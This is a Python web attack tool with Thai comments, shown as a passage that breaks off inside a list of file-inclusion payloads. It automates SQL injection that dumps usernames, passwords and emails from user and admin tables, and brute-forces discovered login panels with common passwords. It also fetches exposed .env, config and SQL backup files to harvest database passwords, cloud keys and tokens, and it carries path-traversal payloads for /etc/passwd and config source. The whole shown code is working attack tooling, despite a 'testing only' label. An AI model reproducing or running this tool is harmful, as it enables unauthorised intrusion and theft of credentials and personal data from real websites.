#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
เครื่องมือเจาะระบบเว็บไซต์ขั้นสูง - สำหรับการทดสอบความปลอดภัยเท่านั้น
พัฒนาโดย: palofsc
รองรับ: SQL Injection (Union-based, Error-based, Time-based), 
        XSS, LFI/RFI, RCE, SSRF, IDOR, การดึงข้อมูลฐานข้อมูล, การเจาะรหัสผ่าน
"""

import requests
import sys
import argparse
import json
import re
import time
import hashlib
import base64
import random
import string
import itertools
from urllib.parse import urljoin, urlparse, parse_qs, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =============================================================================
# คลาสหลักสำหรับการเจาะระบบขั้นสูง
# =============================================================================
class WebPwnAdvanced:
    def __init__(self, target_url, threads=20, timeout=15, proxy=None):
        self.target = target_url.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.proxy = proxy
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}

        self.results = {
            'sqli': [],
            'xss': [],
            'lfi': [],
            'rce': [],
            'ssrf': [],
            'idor': [],
            'admin_panels': [],
            'backup_files': [],
            'sensitive_files': [],
            'credentials': [],
            'database_dump': [],
            'users_extracted': [],
            'passwords_extracted': [],
            'admin_accounts': [],
            'hashes': [],
            'cookies': [],
            'tokens': [],
            'api_keys': []
        }
        self.crawled_urls = set()
        self.forms = []
        self.found_tables = []
        self.found_columns = []

    def _request(self, url, method='GET', data=None, headers=None, cookies=None, allow_redirects=True, files=None):
        try:
            h = dict(self.session.headers)
            if headers:
                h.update(headers)
            c = dict(self.session.cookies)
            if cookies:
                c.update(cookies)

            kwargs = {
                'timeout': self.timeout,
                'headers': h,
                'cookies': c,
                'allow_redirects': allow_redirects
            }

            if method.upper() == 'GET':
                resp = self.session.get(url, **kwargs)
            elif method.upper() == 'POST':
                if files:
                    kwargs.pop('headers')
                    resp = self.session.post(url, data=data, files=files, **kwargs)
                else:
                    resp = self.session.post(url, data=data, **kwargs)
            else:
                resp = self.session.request(method.upper(), url, **kwargs)
            return resp
        except Exception as e:
            return None

    def _random_string(self, length=8):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def _extract_forms(self, html, base_url):
        soup = BeautifulSoup(html, 'html.parser')
        forms = []
        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            action_url = urljoin(base_url, action)
            inputs = []
            for inp in form.find_all(['input', 'textarea', 'select']):
                inp_type = inp.get('type', 'text')
                inp_name = inp.get('name', '')
                inp_value = inp.get('value', '')
                if inp_name:
                    inputs.append({'name': inp_name, 'type': inp_type, 'value': inp_value})
            forms.append({'action': action_url, 'method': method, 'inputs': inputs})
        return forms

    def _extract_links(self, html, base_url):
        soup = BeautifulSoup(html, 'html.parser')
        links = set()
        for tag in soup.find_all(['a', 'link', 'script', 'img', 'form', 'iframe']):
            for attr in ['href', 'src', 'action', 'data-src']:
                val = tag.get(attr)
                if val:
                    full_url = urljoin(base_url, val)
                    if self.target in full_url:
                        links.add(full_url.split('#')[0])
        return links

    def _extract_emails(self, text):
        return re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)

    def _extract_api_keys(self, text):
        patterns = [
            r'[a-zA-Z0-9]{32,64}',
            r'sk-[a-zA-Z0-9]{48}',
            r'ghp_[a-zA-Z0-9]{36}',
            r'AKIA[0-9A-Z]{16}',
            r'[0-9a-f]{32}-us[0-9]{1,2}',
        ]
        keys = []
        for p in patterns:
            keys.extend(re.findall(p, text))
        return keys

    # =========================================================================
    # SQL Injection ขั้นสูง - ดึงข้อมูลจริงจากฐานข้อมูล
    # =========================================================================
    def exploit_sqli_union(self, url, param, db_type='mysql'):
        """ใช้ Union-based SQLi เพื่อดึงข้อมูลจากฐานข้อมูล"""
        extracted_data = []

        for i in range(1, 20):
            if db_type == 'mysql':
                payload = f"' UNION SELECT {','.join(['NULL']*i)}-- -"
            elif db_type == 'mssql':
                payload = f"' UNION SELECT {','.join(['NULL']*i)}--"
            else:
                payload = f"' UNION SELECT {','.join(['NULL']*i)}--"

            test_url = url.replace(f"{param}=", f"{param}={payload}")
            resp = self._request(test_url)
            if resp and resp.status_code == 200:
                marker = self._random_string()
                for pos in range(1, i+1):
                    if db_type == 'mysql':
                        cols = ['NULL'] * i
                        cols[pos-1] = f"'{marker}'"
                        payload = f"' UNION SELECT {','.join(cols)}-- -"
                    test_url2 = url.replace(f"{param}=", f"{param}={payload}")
                    resp2 = self._request(test_url2)
                    if resp2 and marker in resp2.text:
                        return self._extract_database_data(url, param, db_type, i, pos)
        return extracted_data

    def _extract_database_data(self, url, param, db_type, num_cols, output_col):
        """ดึงข้อมูลจากฐานข้อมูลโดยใช้ Union-based SQLi"""
        data = {'database': '', 'version': '', 'user': '', 'tables': [], 'columns': {}, 'dump': []}

        if db_type == 'mysql':
            # ดึงชื่อฐานข้อมูล
            db_payload = self._build_union_payload(num_cols, output_col, 'database()')
            db_url = url.replace(f"{param}=", f"{param}={db_payload}")
            resp = self._request(db_url)
            if resp:
                data['database'] = self._extract_union_output(resp.text, db_url)

            # ดึงเวอร์ชัน
            ver_payload = self._build_union_payload(num_cols, output_col, 'version()')
            ver_url = url.replace(f"{param}=", f"{param}={ver_payload}")
            resp = self._request(ver_url)
            if resp:
                data['version'] = self._extract_union_output(resp.text, ver_url)

            # ดึงชื่อผู้ใช้
            user_payload = self._build_union_payload(num_cols, output_col, 'user()')
            user_url = url.replace(f"{param}=", f"{param}={user_payload}")
            resp = self._request(user_url)
            if resp:
                data['user'] = self._extract_union_output(resp.text, user_url)

            # ดึงรายชื่อตาราง
            tables_payload = self._build_union_payload(
                num_cols, output_col,
                "GROUP_CONCAT(table_name SEPARATOR '|||') FROM information_schema.tables WHERE table_schema=database()"
            )
            tables_url = url.replace(f"{param}=", f"{param}={tables_payload}")
            resp = self._request(tables_url)
            if resp:
                tables_text = self._extract_union_output(resp.text, tables_url)
                if tables_text:
                    data['tables'] = tables_text.split('|||')

            # ดึงข้อมูลจากตาราง users หรือ admin
            target_tables = ['users', 'user', 'admin', 'admins', 'members', 'accounts', 
                           'customers', 'clients', 'wp_users', 'tbl_users', 'tb_user']

            for table in data['tables']:
                if any(t in table.lower() for t in target_tables):
                    # ดึงชื่อคอลัมน์
                    cols_payload = self._build_union_payload(
                        num_cols, output_col,
                        f"GROUP_CONCAT(column_name SEPARATOR '|||') FROM information_schema.columns WHERE table_name='{table}'"
                    )
                    cols_url = url.replace(f"{param}=", f"{param}={cols_payload}")
                    resp = self._request(cols_url)
                    if resp:
                        cols_text = self._extract_union_output(resp.text, cols_url)
                        if cols_text:
                            data['columns'][table] = cols_text.split('|||')

                            # ดึงข้อมูลผู้ใช้
                            user_cols = [c for c in data['columns'][table] 
                                       if any(k in c.lower() for k in ['user', 'name', 'login', 'email', 'pass', 'pwd', 'hash'])]
                            if user_cols:
                                concat_cols = "CONCAT('USER:',COALESCE(username,user,login,name,email,'NULL'),'|PASS:',COALESCE(password,passwd,pwd,pass_hash,hash,'NULL'),'|EMAIL:',COALESCE(email,'NULL'))"
                                dump_payload = self._build_union_payload(
                                    num_cols, output_col,
                                    f"GROUP_CONCAT({concat_cols} SEPARATOR '\n') FROM {table} LIMIT 50"
                                )
                                dump_url = url.replace(f"{param}=", f"{param}={dump_payload}")
                                resp = self._request(dump_url)
                                if resp:
                                    dump_text = self._extract_union_output(resp.text, dump_url)
                                    if dump_text:
                                        data['dump'].extend(dump_text.split('\n'))
                                        for line in dump_text.split('\n'):
                                            if 'USER:' in line and 'PASS:' in line:
                                                user_match = re.search(r'USER:([^|]+)', line)
                                                pass_match = re.search(r'PASS:([^|]+)', line)
                                                email_match = re.search(r'EMAIL:([^|]+)', line)
                                                if user_match and pass_match:
                                                    self.results['users_extracted'].append({
                                                        'username': user_match.group(1).strip(),
                                                        'password': pass_match.group(1).strip(),
                                                        'email': email_match.group(1).strip() if email_match else '',
                                                        'source': f"SQLi UNION - Table: {table}",
                                                        'url': url
                                                    })
                                                    if any(k in user_match.group(1).lower() for k in ['admin', 'root', 'manager']):
                                                        self.results['admin_accounts'].append({
                                                            'username': user_match.group(1).strip(),
                                                            'password': pass_match.group(1).strip(),
                                                            'source': f"SQLi UNION - Admin Table: {table}"
                                                        })

        return data

    def _build_union_payload(self, num_cols, output_col, query):
        cols = ['NULL'] * num_cols
        cols[output_col - 1] = query
        return f"' UNION SELECT {','.join(cols)}-- -"

    def _extract_union_output(self, html, url):
        soup = BeautifulSoup(html, 'html.parser')
        text = soup.get_text()
        lines = [l.strip() for l in text.split('\n') if l.strip() and len(l.strip()) > 2]
        for line in lines:
            if any(c in line for c in ['|||', 'USER:', 'PASS:', '@', ':', '_']) and len(line) > 5:
                return line
        return '\n'.join(lines[-5:]) if lines else ''

    def exploit_sqli_error(self, url, param, db_type='mysql'):
        data = {}

        if db_type == 'mysql':
            payloads = [
                f"' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",
                f"' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--",
            ]

            for payload in payloads:
                test_url = url.replace(f"{param}=", f"{param}={payload}")
                resp = self._request(test_url)
                if resp:
                    db_match = re.search(r"XPATH syntax error: '~(.+?)~'", resp.text)
                    if db_match:
                        data['database'] = db_match.group(1)

                        table_payload = f"' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--"
                        table_url = url.replace(f"{param}=", f"{param}={table_payload}")
                        resp2 = self._request(table_url)
                        if resp2:
                            table_match = re.search(r"XPATH syntax error: '~(.+?)~'", resp2.text)
                            if table_match:
                                data['tables'] = table_match.group(1).split(',')

                                for table in data['tables']:
                                    if 'user' in table.lower() or 'admin' in table.lower():
                                        col_payload = f"' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='{table}'),0x7e))--"
                                        col_url = url.replace(f"{param}=", f"{param}={col_payload}")
                                        resp3 = self._request(col_url)
                                        if resp3:
                                            col_match = re.search(r"XPATH syntax error: '~(.+?)~'", resp3.text)
                                            if col_match:
                                                data['columns'] = col_match.group(1).split(',')

                                                dump_payload = f"' AND extractvalue(1,concat(0x7e,(SELECT concat_ws(':',username,password,email) FROM {table} LIMIT 1),0x7e))--"
                                                dump_url = url.replace(f"{param}=", f"{param}={dump_payload}")
                                                resp4 = self._request(dump_url)
                                                if resp4:
                                                    dump_match = re.search(r"XPATH syntax error: '~(.+?)~'", resp4.text)
                                                    if dump_match:
                                                        creds = dump_match.group(1).split(':')
                                                        if len(creds) >= 2:
                                                            self.results['users_extracted'].append({
                                                                'username': creds[0],
                                                                'password': creds[1],
                                                                'email': creds[2] if len(creds) > 2 else '',
                                                                'source': f"SQLi Error-based - Table: {table}",
                                                                'url': url
                                                            })
        return data

    def exploit_sqli_time(self, url, param, db_type='mysql'):
        data = {}

        def time_check(payload):
            start = time.time()
            test_url = url.replace(f"{param}=", f"{param}={payload}")
            self._request(test_url)
            return time.time() - start > 4

        if db_type == 'mysql':
            if time_check("' AND SLEEP(5)--"):
                data['confirmed'] = True
                data['type'] = 'Time-based Blind SQLi'

                db_len = 0
                for i in range(1, 50):
                    if time_check(f"' AND IF(LENGTH(database())={i},SLEEP(5),0)--"):
                        db_len = i
                        break

                if db_len > 0:
                    db_name = ''
                    for i in range(1, db_len + 1):
                        for c in range(32, 127):
                            if time_check(f"' AND IF(ASCII(SUBSTRING(database(),{i},1))={c},SLEEP(5),0)--"):
                                db_name += chr(c)
                                break
                    data['database'] = db_name

        return data

    def scan_sqli_advanced(self):
        detection_payloads = [
            ("' OR '1'='1", "generic"),
            ("' OR 1=1-- -", "mysql"),
            ("' UNION SELECT NULL--", "mysql"),
            ("'; WAITFOR DELAY '0:0:5'--", "mssql"),
            ("1'; SELECT pg_sleep(5)--", "postgresql"),
            ("1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)", "mysql_time"),
            ("1 AND 1=1", "boolean_true"),
            ("1 AND 1=2", "boolean_false"),
        ]

        error_patterns = [
            ("sql syntax", "mysql"), ("mysql_fetch", "mysql"), ("ORA-", "oracle"),
            ("PostgreSQL", "postgresql"), ("SQLite", "sqlite"),
            ("Warning: mysql", "mysql"), ("unclosed quotation", "generic"),
            ("quoted string not properly terminated", "oracle"),
            ("Microsoft OLE DB Provider", "mssql"), ("ODBC SQL Server Driver", "mssql"),
            ("java.sql.SQLException", "java"), ("pg_query()", "postgresql"),
            ("mysql_error()", "mysql"), ("mysqli_error()", "mysql"),
            ("You have an error in your SQL syntax", "mysql"),
        ]

        test_urls = [u for u in self.crawled_urls if '?' in u][:30]

        for url in test_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if not params:
                continue

            for param in params:
                for payload, db_type in detection_payloads[:3]:
                    test_url = url.replace(f"{param}={params[param][0]}", f"{param}={payload}")
                    resp = self._request(test_url)
                    if resp:
                        for pattern, detected_db in error_patterns:
                            if pattern.lower() in resp.text.lower():
                                self.results['sqli'].append({
                                    'url': test_url,
                                    'parameter': param,
                                    'payload': payload,
                                    'error': pattern,
                                    'type': f'Error-based SQLi ({detected_db})',
                                    'db_type': detected_db
                                })

                                if detected_db in ['mysql', 'generic']:
                                    extracted = self.exploit_sqli_error(url, param, 'mysql')
                                    if extracted:
                                        self.results['sqli'][-1]['extracted_data'] = extracted
                                break

                union_data = self.exploit_sqli_union(url, param, 'mysql')
                if union_data and (union_data.get('database') or union_data.get('dump')):
                    self.results['sqli'].append({
                        'url': url,
                        'parameter': param,
                        'type': 'Union-based SQLi',
                        'extracted_data': union_data
                    })

                time_data = self.exploit_sqli_time(url, param, 'mysql')
                if time_data.get('confirmed'):
                    self.results['sqli'].append({
                        'url': url,
                        'parameter': param,
                        'type': 'Time-based Blind SQLi',
                        'extracted_data': time_data
                    })

    # =========================================================================
    # Brute Force Login
    # =========================================================================
    def brute_force_login(self, login_url, username_field='username', password_field='password', 
                         usernames=None, passwords=None):
        if not usernames:
            usernames = ['admin', 'administrator', 'root', 'user', 'test', 'guest', 
                        'manager', 'support', 'webmaster', 'postmaster']
        if not passwords:
            passwords = ['admin', 'password', '123456', '12345678', 'qwerty', 'letmein',
                        'welcome', 'monkey', 'dragon', 'master', 'shadow', 'sunshine',
                        'princess', 'football', 'baseball', 'iloveyou', 'admin123',
                        'password123', '1234567890', 'abc123', 'login', 'qwerty123',
                        '1q2w3e4r', 'zaq12wsx', 'password1', '123123', '000000',
                        'trustno1', 'jesus', 'ninja', 'mustang', 'access', 'love',
                        'pussy', '696969', 'qwertyuiop', 'superman', 'batman',
                        'harley', 'ranger', 'thomas', 'robert', 'michael', 'jordan',
                        'maggie', 'buster', 'daniel', 'andrew', 'joshua', 'pepper',
                        'ginger', 'taylor', 'austin', 'merlin', 'matthew', 'oliver',
                        'william', 'charlie', 'martin', 'cheese', 'amanda', 'summer',
                        'peanut', 'cookie', 'ashley', 'bandit', 'killer', 'matrix']

        found = []

        resp = self._request(login_url)
        method = 'POST'
        forms = self._extract_forms(resp.text if resp else '', login_url)
        if forms:
            method = forms[0]['method']

        def try_login(cred):
            user, pwd = cred
            data = {username_field: user, password_field: pwd}

            if method == 'GET':
                test_url = f"{login_url}?{username_field}={user}&{password_field}={pwd}"
                resp = self._request(test_url)
            else:
                resp = self._request(login_url, method='POST', data=data)

            if resp:
                indicators = ['dashboard', 'welcome', 'logout', 'profile', 'admin', 
                            'control panel', 'หน้าหลัก', 'ยินดีต้อนรับ', 'ออกจากระบบ']
                error_indicators = ['invalid', 'incorrect', 'wrong', 'error', 'failed',
                                  'ไม่ถูกต้อง', 'ผิดพลาด', 'ล้มเหลว']

                text_lower = resp.text.lower()
                has_success = any(i in text_lower for i in indicators)
                has_error = any(i in text_lower for i in error_indicators)

                if has_success and not has_error:
                    if resp.status_code in [200, 301, 302]:
                        found.append({
                            'username': user,
                            'password': pwd,
                            'url': login_url,
                            'method': method
                        })
                        self.results['credentials'].append({
                            'username': user,
                            'password': pwd,
                            'source': f'Brute Force - {login_url}'
                        })
                        if any(k in user.lower() for k in ['admin', 'root', 'manager']):
                            self.results['admin_accounts'].append({
                                'username': user,
                                'password': pwd,
                                'source': f'Brute Force Admin - {login_url}'
                            })
                        return True
            return False

        credentials = list(itertools.product(usernames, passwords))

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            list(executor.map(try_login, credentials))

        return found

    def scan_and_brute_admin(self):
        admin_paths = [
            '/admin', '/administrator', '/admin.php', '/admin.html',
            '/admin/login', '/admin/login.php', '/admin/index.php',
            '/adminpanel', '/admin_panel', '/admin-area',
            '/adm', '/manage', '/manager', '/management',
            '/cms', '/cms/login', '/cms/admin',
            '/wp-admin', '/wp-login.php', '/wp-login',
            '/login', '/login.php', '/login.html', '/signin',
            '/user', '/user/login', '/account/login',
            '/backend', '/backend/login', '/backoffice',
            '/control', '/control-panel', '/cpanel',
            '/dashboard', '/dashboard/login',
            '/moderator', '/moderator/login',
            '/webadmin', '/webadmin/login',
            '/panel', '/panel/login', '/admincp',
            '/admin1', '/admin2', '/admin3', '/admin4',
            '/admin5', '/admin6', '/admin7', '/admin8', '/admin9',
            '/administrator.php', '/administrator.html',
            '/administrator/index.php', '/administrator/login.php',
            '/phpmyadmin', '/phpMyAdmin', '/pma', '/myadmin',
            '/mysql', '/mysqladmin', '/dbadmin',
            '/cp', '/controlpanel', '/control-panel',
            '/member', '/member/login', '/members/login',
            '/secure', '/secure/login', '/private',
            '/root', '/superuser', '/superuser/login',
        ]

        login_pages = []

        def check_admin(path):
            url = self.target + path
            resp = self._request(url, allow_redirects=False)
            if resp and resp.status_code in [200, 301, 302, 401, 403]:
                title = ''
                try:
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    title = soup.title.string.strip() if soup.title else ''
                except:
                    pass

                has_form = 'form' in resp.text.lower() and any(k in resp.text.lower() for k in ['password', 'pass', 'pwd', 'login'])

                self.results['admin_panels'].append({
                    'url': url,
                    'status': resp.status_code,
                    'title': title,
                    'size': len(resp.content),
                    'has_login_form': has_form
                })

                if has_form:
                    login_pages.append(url)

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(check_admin, admin_paths)

        for login_url in login_pages:
            print(f"[*] กำลังเจาะรหัสผ่าน: {login_url}")
            found = self.brute_force_login(login_url)
            if found:
                print(f"[!!!] พบรหัสผ่านที่ {login_url}: {found}")

    def scan_sensitive_files(self):
        sensitive_paths = [
            '/.env', '/.env.local', '/.env.production', '/.env.dev', '/.env.backup',
            '/config.php', '/config.inc.php', '/configuration.php',
            '/wp-config.php', '/wp-config.php.bak', '/wp-config.php~', '/wp-config.php.save',
            '/settings.php', '/database.php', '/db.php', '/connect.php',
            '/config.json', '/config.xml', '/config.yaml', '/config.yml',
            '/.htaccess', '/.htpasswd', '/web.config',
            '/.git/config', '/.git/HEAD', '/.git/index', '/.git/logs/HEAD',
            '/.gitignore', '/.gitattributes',
            '/robots.txt', '/sitemap.xml', '/crossdomain.xml',
            '/phpinfo.php', '/info.php', '/php.ini',
            '/.DS_Store', '/Thumbs.db',
            '/error.log', '/access.log', '/debug.log', '/log.txt',
            '/logs/error.log', '/logs/access.log', '/logs/debug.log',
            '/api/', '/swagger.json', '/swagger-ui.html', '/api-docs',
            '/v1/', '/v2/', '/graphql', '/graphiql',
            '/README.md', '/readme.txt', '/INSTALL.txt',
            '/CHANGELOG.txt', '/LICENSE.txt',
            '/test.php', '/test/', '/testing/', '/dev/', '/staging/',
            '/adminer.php', '/phpmyadmin/', '/pma/', '/myadmin/',
            '/backup.zip', '/backup.tar.gz', '/backup.sql', '/backup.rar',
            '/www.zip', '/www.tar.gz', '/site.zip', '/site.tar.gz',
            '/.backup', '/backup/', '/backups/', '/old/', '/backup_old/',
            '/db.sql', '/database.sql', '/dump.sql', '/mysql.sql',
            '/backup.sql.gz', '/db_backup.sql', '/data.sql',
            '/dump.sql.gz', '/sql.zip', '/database.zip',
            '/.sql', '/db.sql.zip', '/backup.sql.zip',
            '/.well-known/', '/.svn/', '/.hg/',
            '/composer.json', '/composer.lock', '/package.json',
            '/Dockerfile', '/docker-compose.yml', '/docker-compose.yaml',
            '/.dockerignore', '/.editorconfig', '/.travis.yml',
            '/.gitlab-ci.yml', '/Jenkinsfile', '/Makefile',
            '/app/etc/local.xml', '/app/etc/env.php',
            '/sites/default/settings.php',
            '/application/config/database.php',
            '/system/application/config/database.php',
            '/includes/config.php', '/includes/database.php',
            '/conn.php', '/connection.php', '/dbconnect.php',
            '/connect.php', '/mysqli_connect.php', '/pdo_connect.php',
        ]

        def check_file(path):
            url = self.target + path
            resp = self._request(url)
            if resp and resp.status_code == 200:
                content_length = len(resp.content)
                if content_length > 0:
                    self.results['sensitive_files'].append({
                        'url': url,
                        'status': resp.status_code,
                        'size': content_length,
                        'type': path
                    })

                    self._extract_all_credentials(resp.text, url)

                    if '.env' in path:
                        self._parse_env_file(resp.text, url)

                    if 'config' in path.lower() or 'wp-config' in path.lower():
                        self._parse_config_file(resp.text, url)

                    if '.log' in path.lower():
                        self._parse_log_file(resp.text, url)

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(check_file, sensitive_paths)

    def _extract_all_credentials(self, text, source_url):
        patterns = [
            (r'DB_PASSWORD\s*=\s*["\']?([^"\'\n]+)["\']?', 'DB_PASSWORD'),
            (r'DB_PASS\s*=\s*["\']?([^"\'\n]+)["\']?', 'DB_PASS'),
            (r'MYSQL_PASSWORD\s*=\s*["\']?([^"\'\n]+)["\']?', 'MYSQL_PASSWORD'),
            (r'DATABASE_PASSWORD\s*=\s*["\']?([^"\'\n]+)["\']?', 'DATABASE_PASSWORD'),
            (r'password\s*=\s*["\']?([^"\'\n]{4,})["\']?', 'password'),
            (r'passwd\s*=\s*["\']?([^"\'\n]{4,})["\']?', 'passwd'),
            (r'pwd\s*=\s*["\']?([^"\'\n]{4,})["\']?', 'pwd'),
            (r'AUTH_PASSWORD\s*=\s*["\']?([^"\'\n]+)["\']?', 'AUTH_PASSWORD'),
            (r'SECRET_KEY\s*=\s*["\']?([^"\'\n]+)["\']?', 'SECRET_KEY'),
            (r'API_KEY\s*=\s*["\']?([^"\'\n]+)["\']?', 'API_KEY'),
            (r'API_SECRET\s*=\s*["\']?([^"\'\n]+)["\']?', 'API_SECRET'),
            (r'AWS_ACCESS_KEY_ID\s*=\s*["\']?([^"\'\n]+)["\']?', 'AWS_ACCESS_KEY_ID'),
            (r'AWS_SECRET_ACCESS_KEY\s*=\s*["\']?([^"\'\n]+)["\']?', 'AWS_SECRET_ACCESS_KEY'),
            (r'PRIVATE_KEY\s*=\s*["\']?([^"\'\n]+)["\']?', 'PRIVATE_KEY'),
            (r'SSH_KEY\s*=\s*["\']?([^"\'\n]+)["\']?', 'SSH_KEY'),
            (r'TOKEN\s*=\s*["\']?([^"\'\n]{20,})["\']?', 'TOKEN'),
            (r'JWT_SECRET\s*=\s*["\']?([^"\'\n]+)["\']?', 'JWT_SECRET'),
            (r'OAUTH_TOKEN\s*=\s*["\']?([^"\'\n]+)["\']?', 'OAUTH_TOKEN'),
            (r'STRIPE_KEY\s*=\s*["\']?([^"\'\n]+)["\']?', 'STRIPE_KEY'),
            (r'SENDGRID_KEY\s*=\s*["\']?([^"\'\n]+)["\']?', 'SENDGRID_KEY'),
            (r'MAIL_PASSWORD\s*=\s*["\']?([^"\'\n]+)["\']?', 'MAIL_PASSWORD'),
            (r'SMTP_PASSWORD\s*=\s*["\']?([^"\'\n]+)["\']?', 'SMTP_PASSWORD'),
            (r'root:([^:\n]+):', 'linux_root_password'),
            (r'admin:([^:\n]+):', 'linux_admin_password'),
        ]

        for pattern, cred_type in patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                if len(match) > 3 and match not in ['localhost', 'utf8', 'utf8mb4', 'true', 'false', 'null', 'yes', 'no']:
                    self.results['credentials'].append({
                        'source': source_url,
                        'type': cred_type,
                        'credential': match,
                        'pattern': pattern
                    })

                    if 'password' in cred_type.lower() or 'pass' in cred_type.lower():
                        self.results['passwords_extracted'].append({
                            'password': match,
                            'source': source_url,
                            'type': cred_type
                        })

                    if 'key' in cred_type.lower() or 'token' in cred_type.lower() or 'secret' in cred_type.lower():
                        self.results['api_keys'].append({
                            'key': match,
                            'type': cred_type,
                            'source': source_url
                        })

    def _parse_env_file(self, text, source_url):
        lines = text.split('\n')
        for line in lines:
            line = line.strip()
            if '=' in line and not line.startswith('#'):
                key, val = line.split('=', 1)
                key = key.strip()
                val = val.strip().strip('"').strip("'")

                sensitive_keys = ['password', 'secret', 'key', 'token', 'auth', 'credential', 'pass', 'pwd']
                if any(sk in key.lower() for sk in sensitive_keys) and len(val) > 3:
                    self.results['credentials'].append({
                        'source': source_url,
                        'type': f'ENV:{key}',
                        'credential': val
                    })

    def _parse_config_file(self, text, source_url):
        db_patterns = [
            (r"define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)", 'DB_NAME'),
            (r"define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)", 'DB_USER'),
            (r"define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)", 'DB_PASSWORD'),
            (r"define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)", 'DB_HOST'),
            (r"\$db\['name'\]\s*=\s*['\"]([^'\"]+)['\"]", 'db_name'),
            (r"\$db\['user'\]\s*=\s*['\"]([^'\"]+)['\"]", 'db_user'),
            (r"\$db\['pass'\]\s*=\s*['\"]([^'\"]+)['\"]", 'db_pass'),
        ]

        for pattern, key in db_patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                self.results['credentials'].append({
                    'source': source_url,
                    'type': f'CONFIG:{key}',
                    'credential': match
                })

    def _parse_log_file(self, text, source_url):
        patterns = [
            r'password=([^&\s]+)',
            r'passwd=([^&\s]+)',
            r'token=([^&\s]+)',
            r'session=([^&\s]+)',
            r'api[_-]?key=([^&\s]+)',
            r'auth=([^&\s]+)',
        ]

        for pattern in patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                self.results['credentials'].append({
                    'source': source_url,
                    'type': 'LOG_EXTRACT',
                    'credential': match
                })

    def scan_database_dumps(self):
        db_extensions = ['.sql', '.sql.gz', '.sql.zip', '.sql.tar.gz', '.dump', '.backup', '.sql.bz2']
        common_names = ['database', 'db', 'backup', 'dump', 'mysql', 'data', 'site', 'www', 'all', 'full']

        paths = []
        for name in common_names:
            for ext in db_extensions:
                paths.append(f'/{name}{ext}')
                paths.append(f'/{name}_backup{ext}')
                paths.append(f'/{name}_dump{ext}')
                paths.append(f'/backup/{name}{ext}')
                paths.append(f'/backups/{name}{ext}')
                paths.append(f'/db/{name}{ext}')
                paths.append(f'/database/{name}{ext}')
                paths.append(f'/{name}2024{ext}')
                paths.append(f'/{name}2025{ext}')
                paths.append(f'/{name}2026{ext}')

        def check_db(path):
            url = self.target + path
            resp = self._request(url, allow_redirects=False)
            if resp and resp.status_code == 200:
                content_type = resp.headers.get('Content-Type', '')
                if 'sql' in content_type.lower() or len(resp.content) > 1000:
                    self.results['backup_files'].append({
                        'url': url,
                        'size': len(resp.content),
                        'type': 'Database Dump'
                    })

                    if path.endswith('.sql') and len(resp.content) < 5000000:
                        self._parse_sql_dump(resp.text, url)

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(check_db, paths)

    def _parse_sql_dump(self, text, source_url):
        insert_patterns = [
            r"INSERT INTO \`?(users|user|admin|admins|members|accounts|wp_users|tbl_users|tb_user)\`?\s*VALUES\s*\((.+?)\);",
            r"INSERT INTO\s+(users|user|admin|admins|members|accounts)\s*\(([^)]+)\)\s*VALUES\s*\((.+?)\);",
        ]

        for pattern in insert_patterns:
            matches = re.findall(pattern, text, re.IGNORECASE | re.DOTALL)
            for match in matches:
                values_str = match[1] if isinstance(match, tuple) and len(match) > 1 else str(match)
                user_match = re.search(r"'([^']{3,20})'", values_str)
                pass_match = re.search(r"'([a-f0-9]{32}|[a-f0-9]{40}|[a-f0-9]{64}|[^']{4,50})'", values_str)

                if user_match:
                    username = user_match.group(1)
                    password = pass_match.group(1) if pass_match else ''

                    self.results['users_extracted'].append({
                        'username': username,
                        'password': password,
                        'source': f'SQL Dump - {source_url}'
                    })

                    if len(password) == 32 and all(c in '0123456789abcdef' for c in password.lower()):
                        self.results['hashes'].append({
                            'hash': password,
                            'type': 'MD5',
                            'username': username,
                            'source': source_url
                        })

    def scan_lfi(self):
        lfi_payloads = [
            ('../../../etc/passwd', 'linux_passwd'),
            ('..%2f..%2f..%2fetc%2fpasswd', 'linux_passwd'),
            ('....//....//....//etc/passwd', 'linux_passwd'),
            ('/etc/passwd', 'linux_passwd'),
            ('file:///etc/passwd', 'linux_passwd'),
            ('php://filter/read=convert.base64-encode/resource=index.php', 'php_source'),
            ('php://filter/read=convert.base64-encode/resource=config.php', 'config_source'),
            ('php://filter/read=convert.base64-encode/resource=wp-config.php', 'wp_config'),
